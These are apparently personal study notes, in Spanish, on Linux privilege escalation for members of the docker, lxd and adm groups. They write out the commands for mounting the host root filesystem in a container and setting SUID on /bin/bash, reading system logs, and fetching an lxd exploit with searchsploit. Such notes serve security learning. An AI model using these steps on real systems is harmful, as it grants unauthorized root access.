> Hay acciones que podemos realizar como usuario no privilegiados cuando pertenecemos a determinado grupo.

Grupos vulnerables:
- docker
- lxd
- adm

## Paso a paso
### Con docker
- Agregamos a savitar al grupo docker
```
usermod -a -G docker savitar
```
- Verificamos
```
su savitar 
id
```
- Ahora puedo listar imagenes, contenedores, etc

```
docker pull ubuntu:latest
docker run --rm -dit -v /:/mnt/root --name prives ubuntu
```
- Lo que hago es aprovecharme de un contenedor y creo un volumen en la raiz de mi maquina
- Si entro al contenedor estoy en el directorio de root, le agrego permisos u+s al /bin/bash y listo.

- Eliminar un usuario del grupo docker
```
gpasswd -d savitar docker
```

### Con adm
- El grupo adm te permite leer los logs, por ejemplo si tenemos un servicio montado leeremos todo.
```
usrmod -a -G adm savitar

ls -l /var/log
ls -l /var/log/apache2/access.log
```
- Lo eliminamos del grupo
```
gpasswd -d savitar adm
```

### Con lxd
```
snap install lxd
```
- lxd es similar a docker
```
usermod -a -G lxd savitar
```
- Buscamos exploits
```
searchsploit lxd privilege scalation
searchsploit -m linux/ruta
mv ruta simple
```
- En los exploits hay indicaciones de como ejecutarlos.
- Hay que ejecutar dos o 3 comandos en tu compu de atacante, porque necesitamos construir el exploit con permisos root que es un comprimido de la maquina de alpine
- Lo ejecutamos y es similar a la de docker, dentro del contenedor esta montado el directorio de root desde el cual se puede darle permisos suid a la bash y ejecutar como root.